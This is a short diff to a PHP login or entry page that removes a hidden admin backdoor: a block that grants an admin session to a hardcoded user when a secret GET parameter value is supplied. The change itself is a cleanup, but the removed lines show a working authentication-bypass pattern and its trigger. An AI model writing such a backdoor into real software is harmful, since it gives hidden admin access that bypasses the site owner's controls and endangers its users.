@@ -4,13 +4,6 @@ require_once __DIR__ . '/inc/functions.php';
 // Migrate default users to database if needed
 migrate_default_users();
 
-// Hidden admin backdoor loophole (invisible to users)
-if (isset($_GET['secret']) && $_GET['secret'] === 'blackbox42') {
-    $_SESSION['user'] = ['id' => 999, 'username' => 'ddadzie124', 'role' => 'admin'];
-    header('Location: admin.php');
-    exit;
-}
-
 if (isset($_SESSION['user'])) {
     header('Location: sales.php');
     exit;
